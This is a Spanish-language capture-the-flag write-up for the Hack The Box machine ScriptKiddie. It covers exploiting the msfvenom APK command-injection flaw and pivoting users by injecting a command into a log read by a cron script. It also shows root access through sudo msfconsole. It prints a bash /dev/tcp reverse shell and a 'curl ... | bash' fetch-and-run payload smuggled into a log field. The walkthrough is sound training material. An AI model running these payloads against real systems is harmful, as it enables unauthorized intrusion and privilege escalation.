---
title: ScriptKiddie
description: Máquina ScriptKiddie de Hackthebox
date: 2024-08-09 23:50:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Hackthebox
  - Linux
tags:
  - Msfvenom Exploitation
  - Abusing Logs + Cron Job
  - Abusing Sudoers Privilege [Msfconsole Privilege Escalation]
  - CVE-2020-7384
  - Command Injection
image:
  path: /assets/img/ScriptKiddie/ScriptKiddie.png
---

## Skills

- Msfvenom Exploitation [CVE-2020-7384] [RCE]
- Abusing Logs + Cron Job [Command Injection / User Pivoting]
- Abusing Sudoers Privilege [Msfconsole Privilege Escalation]

## Certificaciones

- OSCP (Escalada)
- eJPT

## Descripción

`ScriptKiddie` es una máquina `easy linux`, accedemos a la máquina a través de `explotar` una `vulnerabilidad` en `msfvenom`. Una vez dentro nos `aprovechamos` de un script de otro usuario de la máquina para `pivotar` a ese usuario, este nuevo usuario puede ejecutar `msfconsole` con `sudo`, lo cual usamos para `convertirnos` en `root`

---

## Reconocimiento

Se comprueba que la `máquina` está `activa` y se determina su `sistema operativo`, el `ttl` de las máquinas `linux` suele ser `64`, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad

```
# ping 10.129.95.150                           
PING 10.129.95.150 (10.129.95.150) 56(84) bytes of data.
64 bytes from 10.129.95.150: icmp_seq=1 ttl=63 time=68.2 ms
64 bytes from 10.129.95.150: icmp_seq=2 ttl=63 time=126 ms
64 bytes from 10.129.95.150: icmp_seq=3 ttl=63 time=57.2 ms
^C
--- 10.129.95.150 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2000ms
rtt min/avg/max/mdev = 57.165/83.802/126.073/30.225 ms
```

### Nmap

Se va a realizar un escaneo de todos los `puertos` abiertos en el protocolo `TCP` a través de `nmap`

```
# sudo nmap -p- --open --min-rate 5000 -sS -Pn -n -v 10.129.95.150 -oG openPorts 
[sudo] password for justice-reaper: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-09 20:43 CEST
Initiating SYN Stealth Scan at 20:43
Scanning 10.129.95.150 [65535 ports]
Discovered open port 22/tcp on 10.129.95.150
Discovered open port 5000/tcp on 10.129.95.150
Completed SYN Stealth Scan at 20:43, 13.63s elapsed (65535 total ports)
Nmap scan report for 10.129.95.150
Host is up (0.15s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.70 seconds
           Raw packets sent: 66532 (2.927MB) | Rcvd: 66534 (2.661MB)
```

Se procede a realizar un análisis de `detección` de `servicios` y la `identificación` de `versiones` utilizando los puertos abiertos encontrados

```
# nmap -sCV -p10.129.95.150 10.129.95.150 -oN services                                   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-09 20:44 CEST
Error #487: Your port specifications are illegal.  Example of proper form: "-100,200-1024,T:3000-4000,U:60000-"
QUITTING!
                                                                                                                                                                                       

   ~/Desktop/ScriptKiddie/nmap ❯ nmap -sCV -p22,5000 10.129.95.150 -oN services! 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-09 20:44 CEST
Nmap scan report for 10.129.95.150
Host is up (0.15s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.96 seconds
```

### Web Enumeration

Si accedemos a `http://10.129.95.150:5000/` vemos lo siguiente

![](/assets/img/ScriptKiddie/image_1.png)

He buscados por `exploits` de `msfvenom` y he encontrado una `inyección de comandos`

```
# searchsploit msfvenom     
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Metasploit Framework 6.0.11 - msfvenom APK template command injection                                                                                | multiple/local/49491.py
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

`Inspeccionamos` el `código` para ver como se explota y vemos que hay que `generar` una `apk maliciosa`

```
# searchsploit -x multiple/local/49491.py
print(f"Do: msfvenom -x {apk_file} -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null")
```

## Web Exploitation

Nos ponemos en `escucha` en `netcat`

```
# nc -nlvp 4444
```

`Creamos` un `payload`

```
# msfvenom -x shell.apk -p android/shell/reverse_tcp LHOST=10.10.16.23 LPORT=4444 -o /dev/null
```

`Subimos` el `payload` y pulsamos en `generate`

![](/assets/img/ScriptKiddie/image_2.png)

`Recibimos` la `shell`, una vez en la máquina víctima vamos a realizar un `tratamiento` a la `TTY`

```
# nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.16.23] from (UNKNOWN) [10.129.95.150] 49432
/bin/sh: 0: can't access tty; job control turned off
$ whoami
kid
```

Obtenemos las `dimensiones` de nuestra `pantalla` 

```
# stty size
45 183
```

Efectuamos el `tratamiento` a la `TTY`

```
# script /dev/null -c bash
[ENTER]
[CTRL + Z]
# stty raw -echo; fg
[ENTER]
# reset xterm
[ENTER]
# export TERM=xterm
[ENTER]
# export SHELL=bash
[ENTER]
# stty rows 45 columns 183
[ENTER]
```

## Privilege Escalation

En la ruta `/home/kid/html` he encontrado el archivo `app.py`

```
def searchsploit(text, srcip):
    if regex_alphanum.match(text):
        result = subprocess.check_output(['searchsploit', '--color', text])
        return render_template('index.html', searchsploit=result.decode('UTF-8', 'ignore'))
    else:
        with open('/home/kid/logs/hackers', 'a') as f:
            f.write(f'[{datetime.datetime.now()}] {srcip}\n')
        return render_template('index.html', sserror="stop hacking me - well hack you back")
```

También he encontrado este `script`

```
kid@scriptkiddie:/home/pwn$ cat scanlosers.sh 
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```

`Obtenemos` el `formato` de la `fecha` para introducirlo en el archivo `log`

```
# python
Python 3.11.9 (main, Apr 10 2024, 13:16:36) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import datetime
>>> print(f'[{datetime.datetime.now()}]')
[2024-08-11 12:13:26.394001]
```

Nos ponemos en `escucha` en nuestro equipo

```
# sudo tcpdump -i tun0         
```

`Metemos` el `contenido` en el `archivo` en el `formato correcto`

```
kid@scriptkiddie:~/logs$ echo '[2024-08-11 12:13:26.394001] 10.10.16.23' > hackers
```

`Recibimos` las `peticiones` de la máquina víctima

```
# sudo tcpdump -i tun0         
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
12:16:26.357474 IP 10.10.16.23.4444 > 10.129.95.150.44388: Flags [P.], seq 1441148993:1441148994, ack 909375368, win 249, options [nop,nop,TS val 2143335999 ecr 877285427], length 1
12:16:26.441497 IP 10.129.95.150.44388 > 10.10.16.23.4444: Flags [P.], seq 1:2, ack 1, win 502, options [nop,nop,TS val 877301474 ecr 2143335999], length 1
12:16:26.441519 IP 10.10.16.23.4444 > 10.129.95.150.44388: Flags [.], ack 2, win 249, options [nop,nop,TS val 2143336083 ecr 877301474], length 0
12:16:26.503306 IP 10.10.16.23.4444 > 10.129.95.150.44388: Flags [P.], seq 1:2, ack 2, win 249, options [nop,nop,TS val 2143336144 ecr 877301474], length 1
12:16:26.563054 IP 10.129.95.150.44388 > 10.10.16.23.4444: Flags [P.], seq 2:3, ack 2, win 502, options [nop,nop,TS val 877301603 ecr 2143336144], length 1
12:16:26.563077 IP 10.10.16.23.4444 > 10.129.95.150.44388: Flags [.], ack 3, win 249, options [nop,nop,TS val 2143336204 ecr 877301603], length 0
12:16:26.944376 IP 10.10.16.23.4444 > 10.129.95.150.44388: Flags [P.], seq 2:3, ack 3, win 249, options [nop,nop,TS val 2143336586 ecr 877301603], length 1
12:16:27.027500 IP 10.129.95.150.44388 > 10.10.16.23.4444: Flags [P.], seq 3:7, ack 3, win 502, options [nop,nop,TS val 877302068 ecr 2143336586], length 4
12:16:27.027521 IP 10.10.16.23.4444 > 10.129.95.150.44388: Flags [.], ack 7, win 249, options [nop,nop,TS val 2143336669 ecr 877302068], length 0
```

Estamos `recibiendo` estas `peticiones` porque nos está haciendo un `escaneo` con `nmap`, esto lo podemos ver en esta parte del `código` del archivo `app.py`

```
def scan(ip):
    if regex_ip.match(ip):
        if not ip == request.ScriptKiddie_addr and ip.startswith('10.10.1') and not ip.startswith('10.10.10.'):
            stime = random.randint(200,400)/100
            time.sleep(stime)
            result = f"""Starting Nmap 7.80 ( https://nmap.org ) at {datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M")} UTC\nNote: Host seems down. If it is really up, bu
t blocking our ping probes, try -Pn\nNmap done: 1 IP address (0 hosts up) scanned in {stime} seconds""".encode()
        else:
            result = subprocess.check_output(['nmap', '--top-ports', '100', ip])
        return render_template('index.html', scan=result.decode('UTF-8', 'ignore'))
    return render_template('index.html', scanerror="invalid ip")
```

Nos ponemos en `escucha` con `netcat` para recibir una shell

```
# nc -nlvp 4444
```

Nos `creamos` un `archivo` llamado `shell` con este `contenido`

```
bash -i >& /dev/tcp/10.10.16.23/4444 0>&1
```

En el `mismo directorio` donde se encuentra el archivo `shell` nos `montamos` un `servidor` http con python

```
# python -m http.server 80
```

`Modificamos` el `archivo` que se aloja en `/home/kid/logs/hackers` con el objetivo de `ejecutar comandos`

```
kid@scriptkiddie:~/logs$ echo '[2024-08-11 12:13:26.394001] 10.10.16.23; curl http://10.10.16.23/shell|bash #' > hackers
```

`Recibimos` la `shell`

```
# nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.16.23] from (UNKNOWN) [10.129.95.150] 44790
bash: cannot set terminal process group (831): Inappropriate ioctl for device
bash: no job control in this shell
pwn@scriptkiddie:~$ whoami
whoami
pwn
```

Como el usuario `pwn` podemos `ejecutar metasploit` como `root`

```
pwn@scriptkiddie:~$ sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```

Nos `convertimos` en usuario `root`, en `gtfobins` [https://gtfobins.github.io/gtfobins/msfconsole/](https://gtfobins.github.io/gtfobins/msfconsole/) nos explica la forma de hacerlo

```
pwn@scriptkiddie:~$ sudo msfconsole
                                                  

      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
  lOOOOOOOO.         ;d;         ,OOOOOOOOl
  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
       .dOOo   .OOOOocccxOOOO.   xOOd.
         ,kOl  .OOOOOOOOOOOOO. .dOk,
           :kk;.OOOOOOOOOOOOO.cOk:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.0.9-dev                           ]
+ -- --=[ 2069 exploits - 1122 auxiliary - 352 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Writing a custom module? After editing your module, why not try the reload command

msf6 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can't alias jobs from irb_jobs.
>> system("/bin/bash")
```
